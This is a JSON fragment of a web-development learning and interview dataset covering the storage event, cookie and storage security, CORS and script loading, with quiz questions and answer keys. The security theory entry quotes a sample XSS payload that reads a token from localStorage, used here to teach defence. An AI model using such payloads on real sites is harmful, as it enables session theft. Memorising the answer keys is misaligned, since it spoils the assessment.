          "examples": [
            {
              "id": "example_storage_event_1",
              "title": "Listening for localStorage Changes",
              "code": "// Listen for changes to localStorage from other windows/tabs\nwindow.addEventListener('storage', (event) => {\n  console.log('Storage changed:');\n  console.log('  Key:', event.key);\n  console.log('  Old Value:', event.oldValue);\n  console.log('  New Value:', event.newValue);\n  console.log('  Source URL:', event.url);\n  console.log('  Storage Area:', event.storageArea === localStorage ? 'localStorage' : 'sessionStorage');\n\n  if (event.key === 'theme' && event.newValue) {\n    document.documentElement.setAttribute('data-theme', event.newValue);\n    console.log(`Theme updated to: ${event.newValue}`);\n  }\n});\n\n// To simulate a change from another tab, open this page in two tabs\n// and in one tab's console, run:\n// localStorage.setItem('theme', 'dark');\n// localStorage.removeItem('theme');",
              "explanation": "This example demonstrates how to set up a `storage` event listener. When a change occurs in `localStorage` or `sessionStorage` from another browser tab/window of the same origin, this callback will execute, logging the details of the change. A practical application is shown where a 'theme' change propagates across tabs.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_storage_event_1",
            "question_storage_event_2",
            "question_storage_event_3",
            "question_storage_event_4"
          ],
          "relatedTasks": [
            "task_storage_event_sync"
          ],
          "tags": [
            "web-storage",
            "browser-api",
            "event-listener",
            "frontend",
            "synchronization"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "web_storage_basics",
            "event_listeners"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "realtime_web_apps",
            "state_management_frontend"
          ]
        },
        {
          "id": "theory_web_security_storage_cookies",
          "title": "Web Security: Storage Mechanisms and Cookies",
          "content": "When dealing with client-side data storage, it's paramount to understand the security implications. Various mechanisms like `localStorage`, `sessionStorage`, and cookies have different security profiles and vulnerabilities.\n\n## Security Considerations for Web Storage (`localStorage`, `sessionStorage`)\n- **Sensitive Data**: Neither `localStorage` nor `sessionStorage` are suitable for storing sensitive data such as user passwords, authentication tokens (especially long-lived ones), or personal identifiable information (PII). This is because they are easily accessible via JavaScript in the browser.\n- **XSS Vulnerabilities**: Cross-Site Scripting (XSS) attacks can directly expose data stored in `localStorage` and `sessionStorage`. If an attacker injects malicious JavaScript into your page (e.g., via unfiltered user input), that script can read, modify, or delete any data in these storage areas and potentially transmit it to a malicious server. For instance, an XSS payload `alert(localStorage.getItem('userToken'))` could steal a user's session token if stored in `localStorage`.\n\n## Security Considerations for Cookies\nCookies are often used for session management and can be more securely configured than web storage for certain use cases. They offer specific flags to mitigate common attacks:\n- **HttpOnly Flag**: This flag prevents client-side JavaScript from accessing the cookie. If an `HttpOnly` cookie is set, `document.cookie` will not show its value, significantly mitigating XSS attacks that attempt to steal cookies. The cookie will only be sent with HTTP requests.\n- **Secure Flag**: This flag ensures that the cookie is only sent over encrypted HTTPS connections. This prevents man-in-the-middle attacks from intercepting the cookie data when transmitted over an insecure network (HTTP).\n- **SameSite Attribute**: This attribute helps prevent Cross-Site Request Forgery (CSRF) attacks by controlling when cookies are sent with cross-site requests. It has three main values:\n    - `Lax`: Cookies are sent with top-level navigations and same-site requests. Most common and recommended default.\n    - `Strict`: Cookies are only sent with same-site requests, providing the strongest protection.\n    - `None`: Cookies are sent with all requests, including cross-site requests. Requires the `Secure` flag to be set.\n    \nBy properly configuring these flags, cookies can be a more secure option for storing authentication tokens or session IDs, especially when combined with robust server-side validation.",
          "examples": [
            {
              "id": "example_cookie_security_1",
              "title": "Setting Secure Cookies (Server-side Node.js)",
              "code": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  // After successful authentication, set a session cookie\n  res.cookie('sessionToken', 'your_secure_jwt_token', {\n    httpOnly: true, // Prevent JavaScript access\n    secure: true,   // Only send over HTTPS\n    sameSite: 'Lax', // Protect against CSRF\n    maxAge: 3600000 // Cookie valid for 1 hour (in ms)\n  });\n  res.send('Logged in successfully!');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
              "explanation": "This Node.js (Express) example demonstrates how to set a cookie with critical security flags: `httpOnly`, `secure`, and `sameSite`. This configuration prevents JavaScript access to the cookie, ensures it's only sent over HTTPS, and provides CSRF protection, making it significantly more secure for authentication tokens than `localStorage`.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_security_storage_1",
            "question_security_storage_2",
            "question_security_storage_3",
            "question_security_storage_4",
            "question_security_storage_5"
          ],
          "relatedTasks": [
            "task_secure_cookie_implementation"
          ],
          "tags": [
            "web-security",
            "cookies",
            "local-storage",
            "session-storage",
            "xss",
            "csrf",
            "httponly",
            "secure-flag",
            "samesite"
          ],
          "technology": "Web",
          "prerequisites": [
            "web_storage_basics",
            "http_basics",
            "browser_security_fundamentals"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "secure_web_applications",
            "backend_api_development"
          ]
        },
        {
          "id": "theory_web_security_cors",
          "title": "Web Security: Cross-Origin Resource Sharing (CORS)",
          "content": "CORS (Cross-Origin Resource Sharing) is a browser security mechanism that allows web applications running at one domain (origin) to make controlled requests to resources at another domain. It's an essential part of modern web security, enabling safe cross-origin data transfer while upholding the **Same-Origin Policy (SOP)**.\n\n## Same-Origin Policy (SOP)\nBy default, web browsers enforce the Same-Origin Policy. This policy restricts a web page from making requests to a different origin (a different protocol, domain, or port) than the one from which the page was loaded. This prevents malicious scripts on one site from accessing sensitive data on another site (e.g., banking sites).\n\n## How CORS Works\nCORS extends the SOP by using special HTTP headers to allow servers to explicitly specify which origins are permitted to access their resources. When a browser detects a cross-origin request, it checks for these CORS headers in the server's response. If the headers indicate that the origin is allowed, the browser proceeds with the request; otherwise, it blocks it.\n\n### Simple vs. Non-Simple Requests\n- **Simple Requests**: These requests do not trigger a CORS preflight. They must meet all of the following conditions:\n    - Method: GET, POST, or HEAD only.\n    - Headers: Only 'Accept', 'Accept-Language', 'Content-Language', 'Content-Type' (with specific values like `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`).\n- **Non-Simple Requests**: Any request that does not meet the criteria for a simple request (e.g., PUT, DELETE, PATCH methods, or custom headers like `Authorization`). These requests trigger a **Preflight Request**.\n\n### Preflight Requests (`OPTIONS` Method)\nFor non-simple requests, the browser first sends an `OPTIONS` HTTP request (the 'preflight') to the resource on the other origin. This preflight request asks the server for permission to send the actual request. The server's response to the `OPTIONS` request contains CORS headers indicating whether the actual request is allowed (e.g., which methods or headers are permitted). If the preflight succeeds, the browser sends the actual request; otherwise, it blocks it.\n\n## Common CORS Headers\nServers use specific HTTP response headers to control CORS behavior:\n- `Access-Control-Allow-Origin`: Specifies which origins (domains) are allowed to access the resource. Can be a specific origin (e.g., `https://trusted-domain.com`) or `*` (allowing any origin, generally not recommended for production APIs).\n- `Access-Control-Allow-Methods`: Specifies which HTTP methods (e.g., GET, POST, PUT, DELETE) are allowed for the resource.\n- `Access-Control-Allow-Headers`: Specifies which HTTP request headers (e.g., `Content-Type`, `Authorization`, `X-Custom-Header`) are allowed.\n- `Access-Control-Allow-Credentials`: Indicates whether the browser should expose the response to the frontend JavaScript code when the request's credentials mode is `include`. This is necessary for requests that involve cookies, HTTP authentication, or client-side SSL certificates. If set to `true`, `Access-Control-Allow-Origin` cannot be `*`.\n- `Access-Control-Expose-Headers`: Specifies which headers, besides the six simple response headers, are safe to expose to the API of a `XMLHttpRequest` or `Fetch` response.\n- `Access-Control-Max-Age`: Indicates how long the results of a preflight request can be cached by the browser, reducing the number of `OPTIONS` requests.",
          "examples": [
            {
              "id": "example_cors_server_1",
              "title": "Server-side CORS Header Example (Node.js/Express)",
              "code": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  // Allow requests from a specific trusted origin\n  res.header('Access-Control-Allow-Origin', 'https://trusted-domain.com');\n  // Allow common methods\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');\n  // Allow common headers, including custom ones like Authorization\n  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Custom-Header');\n  // Allow credentials (cookies, HTTP auth) to be sent\n  res.header('Access-Control-Allow-Credentials', 'true');\n  // Cache preflight results for 1 hour (3600 seconds)\n  res.header('Access-Control-Max-Age', '3600');\n\n  // Handle preflight OPTIONS requests\n  if (req.method === 'OPTIONS') {\n    return res.sendStatus(204); // No content, just headers\n  }\n\n  next();\n});\n\napp.get('/data', (req, res) => {\n  res.json({ message: 'Data from server!' });\n});\n\napp.listen(4000, () => console.log('CORS-enabled server running on port 4000'));",
              "explanation": "This Node.js (Express) example demonstrates how to configure CORS headers on the server. It allows a specific origin (`https://trusted-domain.com`) to make requests, defines allowed methods and headers, and enables credential support. It also includes handling for preflight `OPTIONS` requests, which are essential for non-simple cross-origin requests.",
              "language": "javascript"
            },
            {
              "id": "example_cors_client_1",
              "title": "Client-side Cross-Origin Fetch Request",
              "code": "async function fetchDataFromApi() {\n  try {\n    // Example of a simple GET request\n    const response = await fetch('http://localhost:4000/data');\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    const data = await response.json();\n    console.log('Received data (simple request):', data);\n\n    // Example of a non-simple POST request with custom header and credentials\n    const postResponse = await fetch('http://localhost:4000/data', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json',\n        'Authorization': 'Bearer my_token_123'\n      },\n      body: JSON.stringify({ item: 'new item' }),\n      credentials: 'include' // Important for sending cookies/auth across origins\n    });\n    if (!postResponse.ok) {\n      throw new Error(`HTTP error! status: ${postResponse.status}`);\n    }\n    const postData = await postResponse.json();\n    console.log('Received data (non-simple request):', postData);\n\n  } catch (error) {\n    console.error('CORS or fetch error:', error);\n  }\n}\n\n// Call the function to test\n// fetchDataFromApi();",
              "explanation": "This client-side JavaScript example shows how to make cross-origin `fetch` requests. The first `GET` request is a simple request. The second `POST` request is a non-simple request because of its `Content-Type` and `Authorization` header, and it explicitly includes `credentials` to send cookies (if allowed by the server's CORS configuration). If the server does not have appropriate CORS headers, these requests will be blocked by the browser.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_cors_1",
            "question_cors_2",
            "question_cors_3",
            "question_cors_4",
            "question_cors_5",
            "question_cors_6",
            "question_cors_7"
          ],
          "relatedTasks": [
            "task_cors_implementation",
            "task_debug_cors"
          ],
          "tags": [
            "web-security",
            "cors",
            "same-origin-policy",
            "http-headers",
            "preflight",
            "frontend",
            "backend",
            "networking"
          ],
          "technology": "Web",
          "prerequisites": [
            "http_basics",
            "network_requests"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "api_integration",
            "fullstack_development",
            "troubleshooting_web_issues"
          ]
        },
        {
          "id": "theory_script_loading_strategies",
          "title": "Script Loading Strategies: Regular, Async, and Defer",
          "content": "The way JavaScript files are included and loaded in an HTML document significantly impacts page rendering performance and user experience. Modern browsers offer several attributes for the `<script>` tag to control script fetching and execution behavior: `async` and `defer`.\n\n## 1. Regular Script Tag\n`<script src=\"script.js\"></script>` or inline `<script>`\n\n- **Blocking Behavior**: When the browser encounters a regular `<script>` tag, it pauses HTML parsing. It then fetches the script, executes it, and only after execution is complete does it resume HTML parsing. This can lead to a noticeable delay in page rendering, especially for large scripts or slow networks.\n- **Execution Order**: Scripts are executed in the order they appear in the HTML.\n- **DOM Dependency**: If placed in the `<head>`, these scripts will execute before the DOM is fully parsed and available.\n\n**When to use**: When the script's execution must happen at exactly that point in the page's parsing, e.g., for polyfills or scripts that dynamically alter the HTML content before it's rendered, or when blocking is acceptable for small, critical scripts.\n\n## 2. Async Script Tag\n`<script async src=\"script.js\"></script>`\n\n- **Parallel Download**: The `async` attribute tells the browser to download the script in parallel with HTML parsing. HTML parsing continues while the script is being fetched.\n- **Independent Execution**: The script executes as soon as it's downloaded, without waiting for HTML parsing to complete or for other scripts. This means script execution can interrupt HTML parsing.\n- **Execution Order**: The execution order of multiple `async` scripts is *not guaranteed*. They execute as soon as they finish downloading.\n- **DOM Dependency**: Should not be used for scripts that depend on the full DOM structure being available.\n\n**When to use**: Best for independent scripts that don't rely on other scripts or the full DOM structure. Common use cases include analytics scripts (e.g., Google Analytics), ad scripts, or third-party widgets, where their immediate availability is less critical than page render speed.\n\n## 3. Defer Script Tag\n`<script defer src=\"script.js\"></script>`\n\n- **Parallel Download**: Similar to `async`, `defer` also downloads the script in parallel with HTML parsing.\n- **Deferred Execution**: The key difference is that `defer` scripts execute *only after* HTML parsing is completely finished (just before the `DOMContentLoaded` event). They do not interrupt HTML parsing.\n- **Execution Order**: The execution order of multiple `defer` scripts *is guaranteed* to be the same as their order in the HTML document.\n- **DOM Dependency**: Ideal for scripts that depend on the full DOM structure and need to execute after it's ready.\n\n**When to use**: Best for scripts that depend on the full DOM structure (e.g., manipulating elements, event listeners) and/or require maintaining execution order with other scripts. This is often the preferred strategy for most application-specific JavaScript.",
          "examples": [
            {
              "id": "example_script_loading_1",
              "title": "Demonstrating Script Loading Behavior",
              "code": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Script Loading Example</title>\n  \n  <!-- Regular Script (blocking) -->\n  <script>\n    console.log('1. Inline regular script (executed immediately, blocks parsing)');\n    // Simulate heavy computation\n    let i = 0; while (i < 100000000) { i++; }\n    console.log('1. Inline regular script finished');\n  </script>\n  \n  <!-- Async Script -->\n  <script async src=\"async-script.js\"></script>\n  \n  <!-- Defer Script -->\n  <script defer src=\"defer-script.js\"></script>\n</head>\n<body>\n  <h1>Script Loading Demo</h1>\n  <div id=\"app\"></div>\n  \n  <!-- Regular Script (blocking, after content) -->\n  <script>\n    console.log('4. Inline regular script at body end (executed after some HTML parsing)');\n    const appDiv = document.getElementById('app');\n    if (appDiv) appDiv.textContent = 'Content from body-end script';\n  </script>\n</body>\n</html>\n\n<!-- async-script.js -->\nconsole.log('2. Async script (downloaded in parallel, executes when ready)');\n// Simulate network delay and execution\nsetTimeout(() => {\n  console.log('2. Async script finished after delay');\n}, 10);\n\n<!-- defer-script.js -->\nconsole.log('3. Defer script (downloaded in parallel, executes after HTML parsing)');\n// Simulate network delay and execution\nsetTimeout(() => {\n  console.log('3. Defer script finished after delay');\n  const appDiv = document.getElementById('app');\n  if (appDiv) appDiv.textContent = 'Content from defer script';\n}, 5);\n",
              "explanation": "This set of files demonstrates the different script loading behaviors. The inline regular script in the head blocks parsing. The `async` script downloads in parallel and executes as soon as it's ready (potentially before `defer` or even before all HTML is parsed). The `defer` script also downloads in parallel but waits until HTML parsing is complete before executing, ensuring DOM availability and preserving relative execution order among other deferred scripts. The regular script at the end of the body executes after the preceding HTML is parsed.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_script_loading_1",
            "question_script_loading_2",
            "question_script_loading_3",
            "question_script_loading_4",
            "question_script_loading_5",
            "question_script_loading_6"
          ],
          "relatedTasks": [
            "task_optimize_script_loading"
          ],
          "tags": [
            "performance",
            "script-loading",
            "async",
            "defer",
            "html-parsing",
            "dom-content-loaded",
            "frontend-optimization"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_structure",
            "javascript_basics",
            "browser_rendering_process"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "web_performance_optimization",
            "large_scale_frontend_apps"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_storage_event_1",
          "topic": "Web Storage 'storage' Event",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `storage` event in JavaScript?",
          "answer": "To notify other browser windows/tabs from the same origin about changes made to `localStorage` or `sessionStorage`.",
          "options": [],
          "analysisPoints": [
            "Checks understanding of the `storage` event's core function.",
            "Distinguishes its purpose from direct `localStorage` operations."
          ],
          "keyConcepts": [
            "storage-event",
            "localStorage",
            "sessionStorage",
            "cross-tab-communication"
          ],
          "evaluationCriteria": [
            "Direct recall of event purpose"
          ],
          "example": "",
          "tags": [
            "web-storage",
            "browser-api",
            "event-listener",
            "flashcard"
          ],
          "prerequisites": [
            "web_storage_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_storage_event_2",
          "topic": "Web Storage 'storage' Event Behavior",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following JavaScript code executed in a browser tab:\n```javascript\nwindow.addEventListener('storage', (event) => {\n  console.log('Storage event fired!');\n});\n\nlocalStorage.setItem('myData', 'value1');\nconsole.log('Item set in localStorage.');\n```\nWhen this code runs, what will be logged to the console?\n\nA) 'Storage event fired!' and 'Item set in localStorage.'\nB) Only 'Storage event fired!'\nC) Only 'Item set in localStorage.'\nD) Nothing will be logged related to the storage event, only 'Item set in localStorage.' will appear.",
          "answer": "C) Only 'Item set in localStorage.'",
          "options": [
            "A) 'Storage event fired!' and 'Item set in localStorage.'",
            "B) Only 'Storage event fired!'",
            "C) Only 'Item set in localStorage.'",
            "D) Nothing will be logged related to the storage event, only 'Item set in localStorage.' will appear."
          ],
          "analysisPoints": [
            "Tests understanding that the `storage` event does not fire in the same window that initiated the change.",
            "Distinguishes between local actions and cross-window events."
          ],
          "keyConcepts": [
            "storage-event",
            "event-triggering",
            "localStorage",
            "same-window"
          ],
          "evaluationCriteria": [
            "Accurate prediction of event behavior",
            "Understanding of event scope"
          ],
          "example": "The `storage` event is designed for *cross-window* communication. If `localStorage.setItem` is called in the same window that has the `storage` event listener, the event listener will *not* be triggered in that window. It would only be triggered in *other* open tabs or windows of the same origin.",
          "tags": [
            "web-storage",
            "browser-api",
            "event-listener",
            "mcq"
          ],
          "prerequisites": [
            "web_storage_basics",
            "event_listeners"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_storage_event_3",
          "topic": "Web Storage 'storage' Event Properties",
          "level": "medium",
          "type": "open",
          "question": "Imagine you are building a real-time collaborative document editor where changes made in one tab need to be reflected in another tab instantly. Explain how the `storage` event can be leveraged for this functionality. Specifically, describe which properties of the `event` object you would utilize to understand and apply the changes.",
          "answer": "The `storage` event is perfect for this scenario. When a user in one tab makes a change (e.g., saves content to `localStorage`), that tab would call `localStorage.setItem('documentContent', newContent)`. Simultaneously, all *other* tabs for the same document (same origin) would have a `storage` event listener active.\n\nWhen the `storage` event fires in these other tabs, the `event` object would provide the necessary information:\n- `event.key`: This would be `'documentContent'`, indicating that the content of the document has changed.\n- `event.newValue`: This would contain the `newContent` string, which is the updated version of the document from the tab that made the change.\n- `event.oldValue`: This would contain the previous state of the document, useful for comparing changes or implementing undo/redo functionality if needed.\n- `event.url`: Could be used to identify which specific URL initiated the change, though often less critical for direct content synchronization.\n- `event.storageArea`: Would confirm it's `localStorage` being used for persistent storage.\n\nThe listening tabs would then take `event.newValue` and update their respective UI elements (e.g., the `textarea` or display div) to reflect the new document content, effectively synchronizing the editor's state across all open tabs.",
          "options": [],
          "analysisPoints": [
            "Assesses ability to apply the `storage` event to a practical use case.",
            "Verifies knowledge of specific event object properties (`key`, `newValue`, `oldValue`).",
            "Encourages thinking about real-time synchronization challenges."
          ],
          "keyConcepts": [
            "storage-event",
            "real-time-sync",
            "localStorage",
            "event-object-properties",
            "collaborative-apps"
          ],
          "evaluationCriteria": [
            "Clarity of explanation",
            "Correct use of event properties",
            "Realistic application scenario"
          ],
          "example": "",
          "tags": [
            "web-storage",
            "browser-api",
            "event-listener",
            "open-ended",
            "system-design"
          ],
          "prerequisites": [
            "web_storage_basics",
            "event_listeners"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_storage_event_4",
          "topic": "Web Storage Limitations",
          "level": "hard",
          "type": "code",
          "question": "Implement a simplified cross-tab communication mechanism using `localStorage` and the `storage` event. The goal is to create a 'message board' where a message typed in one tab's input field appears in a `div` on all other open tabs. The message should *not* appear in the tab where it was originally typed (it should only appear in `div`s on *other* tabs).\n\nProvide the HTML and JavaScript code.",
          "answer": "```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Cross-Tab Message Board</title>\n</head>\n<body>\n    <h1>Cross-Tab Message Board</h1>\n    <input type=\"text\" id=\"messageInput\" placeholder=\"Type a message...\">\n    <button id=\"sendMessageBtn\">Send Message</button>\n    <h2>Received Messages:</h2>\n    <div id=\"messageDisplay\" style=\"border: 1px solid #ccc; padding: 10px; min-height: 50px;\">No messages yet.</div>\n\n    <script>\n        const messageInput = document.getElementById('messageInput');\n        const sendMessageBtn = document.getElementById('sendMessageBtn');\n        const messageDisplay = document.getElementById('messageDisplay');\n        const MESSAGE_KEY = 'cross_tab_message';\n\n        // Listener for changes made by *other* tabs\n        window.addEventListener('storage', (event) => {\n            if (event.key === MESSAGE_KEY && event.newValue !== null) {\n                // Only update if the message has a new value (not deleted)\n                messageDisplay.textContent = `New message: \"${event.newValue}\"`;\n                console.log(`Received message in this tab from another tab: ${event.newValue}`);\n            } else if (event.key === MESSAGE_KEY && event.newValue === null) {\n                // Handle message deletion/clearing\n                messageDisplay.textContent = 'Message cleared by another tab.';\n                console.log('Message cleared by another tab.');\n            }\n        });\n\n        // Event handler for sending a message\n        sendMessageBtn.addEventListener('click', () => {\n            const message = messageInput.value.trim();\n            if (message) {\n                // Set the item in localStorage, which will trigger the 'storage' event in other tabs\n                localStorage.setItem(MESSAGE_KEY, message);\n                console.log(`Message sent from this tab: \"${message}\"`);\n                messageInput.value = ''; // Clear input after sending\n            }\n        });\n\n        // Optional: Clear message when the tab is closed or reloaded (for a fresh start)\n        window.addEventListener('beforeunload', () => {\n            // You might choose to clear or not clear depending on desired persistence\n            // localStorage.removeItem(MESSAGE_KEY);\n        });\n\n        // Initial check if there's an existing message when a new tab opens\n        const initialMessage = localStorage.getItem(MESSAGE_KEY);\n        if (initialMessage) {\n            messageDisplay.textContent = `Initial message: \"${initialMessage}\"`;\n        }\n\n    </script>\n</body>\n</html>\n```",
          "options": [],
          "analysisPoints": [
            "Tests practical implementation of `storage` event.",
            "Confirms understanding that the `storage` event does not fire in the originator tab.",
            "Assesses ability to handle event properties (`key`, `newValue`).",
            "Evaluates proper use of `localStorage.setItem` to trigger the event."
          ],
          "keyConcepts": [
            "storage-event",
            "localStorage",
            "cross-tab-communication",
            "event-listeners",
            "dom-manipulation"
          ],
          "evaluationCriteria": [
            "Correct use of `addEventListener` for `storage`.",
            "Proper handling of `event.key` and `event.newValue`.",
            "Successful demonstration of cross-tab sync without self-triggering.",
            "Clear and runnable code."
          ],
          "example": "To test this code:\n1.  Save the code as `index.html`.\n2.  Open `index.html` in your browser.\n3.  Duplicate the tab (or open a new tab/window to the same URL).\n4.  Type a message in the input field of one tab and click 'Send Message'.\n5.  Observe that the message appears in the 'Received Messages' div of the *other* tab, but not in the tab where you typed it.",
          "tags": [
            "web-storage",
            "browser-api",
            "event-listener",
            "coding-challenge",
            "hard"
          ],
          "prerequisites": [
            "web_storage_basics",
            "event_listeners",
            "dom_manipulation"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_security_storage_1",
          "topic": "Web Security: Storage & Cookies",
          "level": "easy",
          "type": "flashcard",
          "question": "Why are `localStorage` and `sessionStorage` generally not suitable for sensitive data like authentication tokens?",
          "answer": "Because they are easily accessible via client-side JavaScript, making them vulnerable to XSS attacks.",
          "options": [],
          "analysisPoints": [
            "Tests basic security knowledge regarding client-side storage.",
            "Highlights the primary vulnerability of Web Storage."
          ],
          "keyConcepts": [
            "localStorage",
            "sessionStorage",
            "security",
            "xss",
            "sensitive-data"
          ],
          "evaluationCriteria": [
            "Direct recall of security risk"
          ],
          "example": "",
          "tags": [
            "web-security",
            "local-storage",
            "flashcard"
          ],
          "prerequisites": [
            "web_storage_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_security_storage_2",
          "topic": "Web Security: Cookies",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following cookie flags is used to prevent client-side JavaScript from accessing the cookie, thereby mitigating certain XSS attack vectors?\n\nA) `Secure`\nB) `SameSite`\nC) `HttpOnly`\nD) `Expires`",
          "answer": "C) `HttpOnly`",
          "options": [
            "A) `Secure`",
            "B) `SameSite`",
            "C) `HttpOnly`",
            "D) `Expires`"
          ],
          "analysisPoints": [
            "Tests specific knowledge of cookie security attributes.",
            "Distinguishes `HttpOnly` from other flags like `Secure` and `SameSite`."
          ],
          "keyConcepts": [
            "cookies",
            "httponly",
            "xss",
            "security-flags"
          ],
          "evaluationCriteria": [
            "Correct identification of the `HttpOnly` flag's purpose"
          ],
          "example": "The `HttpOnly` flag ensures that the cookie is not accessible through `document.cookie` in JavaScript. This means that even if an XSS vulnerability allows an attacker to inject malicious scripts, they cannot read and exfiltrate `HttpOnly` cookies. The cookie will still be sent with HTTP requests.",
          "tags": [
            "web-security",
            "cookies",
            "mcq"
          ],
          "prerequisites": [
            "http_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_security_storage_3",
          "topic": "Web Security: Cookies and HTTPS",
          "level": "easy",
          "type": "flashcard",
          "question": "Which cookie flag ensures that a cookie is only sent over encrypted HTTPS connections?",
          "answer": "`Secure`",
          "options": [],
          "analysisPoints": [
            "Tests basic recall of cookie security flags.",
            "Connects a flag to network security (HTTPS)."
          ],
          "keyConcepts": [
            "cookies",
            "secure-flag",
            "https",
            "network-security"
          ],
          "evaluationCriteria": [
            "Direct recall of specific flag"
          ],
          "example": "",
          "tags": [
            "web-security",
            "cookies",
            "flashcard"
          ],
          "prerequisites": [
            "http_basics",
            "https_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_security_storage_4",
          "topic": "Web Security: SameSite Cookie Attribute",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of the `SameSite` cookie attribute and discuss the differences between its `Lax`, `Strict`, and `None` values in the context of preventing CSRF attacks.",
          "answer": "The `SameSite` cookie attribute is a security measure designed to prevent Cross-Site Request Forgery (CSRF) attacks. It controls when cookies are sent with cross-site requests, meaning requests originating from a different site than the one the cookie belongs to. By default, browsers no longer send cookies with all cross-site requests, relying on `SameSite` to dictate this behavior.\n\nHere are the differences between its values:\n\n1.  **`SameSite=Lax` (Default)**:\n    *   **Behavior**: Cookies are sent with same-site requests and with cross-site top-level navigations (e.g., clicking a link that leads to another site, or a `GET` form submission) that change the URL in the address bar. They are *not* sent with cross-site requests initiated by embedded content (like `<img>` tags, `<iframe>`s, `XHR`/`fetch` requests) unless they are top-level navigations.\n    *   **CSRF Protection**: Provides a good balance between security and user experience. It offers strong protection against most common CSRF vectors, as typical CSRF attacks involve non-top-level cross-site requests.\n    *   **Use Case**: Recommended default for most cookies.\n\n2.  **`SameSite=Strict`**:\n    *   **Behavior**: Cookies are *only* sent with same-site requests. They are never sent with any cross-site requests, even if they are top-level navigations.\n    *   **CSRF Protection**: Provides the strongest protection against CSRF, as it entirely prevents cookies from being sent cross-site.\n    *   **Use Case**: Suitable for cookies holding highly sensitive information (e.g., bank session cookies) where strict security is prioritized over user convenience (e.g., user might have to log in again if they click a link from an external site).\n\n3.  **`SameSite=None`**:\n    *   **Behavior**: Cookies are sent with all requests, both same-site and cross-site. This effectively reverts to the older, less secure default behavior.\n    *   **Requirement**: When `SameSite=None` is used, the `Secure` attribute *must* also be set, meaning the cookie will only be sent over HTTPS connections. If `Secure` is not set, `SameSite=None` will be ignored by browsers.\n    *   **CSRF Protection**: Offers *no* CSRF protection on its own. It's used when legitimate cross-site requests require cookies (e.g., third-party widgets, embedded content that needs authentication).\n    *   **Use Case**: Required for cross-site purposes like embedded iframes, certain OAuth flows, or third-party analytics that rely on cookies.\n\nIn summary, `SameSite` is a crucial defense against CSRF, with `Lax` being a good default, `Strict` for maximum security, and `None` (with `Secure`) for specific cross-site functionality.",
          "options": [],
          "analysisPoints": [
            "Tests comprehensive understanding of `SameSite` attribute.",
            "Requires differentiation between `Lax`, `Strict`, and `None`.",
            "Connects attribute to CSRF prevention.",
            "Highlights the `Secure` flag requirement for `SameSite=None`."
          ],
          "keyConcepts": [
            "cookies",
            "samesite",
            "csrf",
            "security-flags",
            "http"
          ],
          "evaluationCriteria": [
            "Accuracy of definitions",
            "Clarity of differences",
            "Correct linkage to CSRF",
            "Completeness of explanation"
          ],
          "example": "",
          "tags": [
            "web-security",
            "cookies",
            "open-ended"
          ],
          "prerequisites": [
            "http_basics",
            "csrf_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_security_storage_5",
          "topic": "Web Security: XSS vs. CSRF",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements most accurately describes the primary difference between how `HttpOnly` and `SameSite` cookie attributes protect against attacks?\n\nA) `HttpOnly` prevents CSRF attacks, while `SameSite` prevents XSS attacks.\nB) `HttpOnly` prevents JavaScript access to cookies (mitigating XSS), while `SameSite` restricts cross-site cookie sending (mitigating CSRF).\nC) Both `HttpOnly` and `SameSite` primarily prevent XSS attacks by restricting cookie visibility.\nD) Both `HttpOnly` and `SameSite` primarily prevent CSRF attacks by ensuring cookies are only sent over HTTPS.",
          "answer": "B) `HttpOnly` prevents JavaScript access to cookies (mitigating XSS), while `SameSite` restricts cross-site cookie sending (mitigating CSRF).",
          "options": [
            "A) `HttpOnly` prevents CSRF attacks, while `SameSite` prevents XSS attacks.",
